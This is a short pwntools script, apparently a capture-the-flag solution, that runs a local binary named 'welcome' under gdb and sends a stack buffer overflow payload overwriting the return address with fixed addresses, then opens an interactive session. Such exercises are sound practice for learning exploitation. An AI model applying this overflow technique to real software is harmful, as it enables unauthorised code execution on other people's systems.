from pwn import *

io = process("./welcome")
io = gdb.debug("./welcome", 
'''
b *0x00000000004012cd
break *0x00000000004012ef
continue
''')
payload = b'a'*8
payload += p64(0x4011f6)
payload += b'a'*32
#payload += p64(0x00000000004011dd)
payload += p64(0x40101a)

io.recvuntil(" name:")
io.sendline(payload)
io.interactive()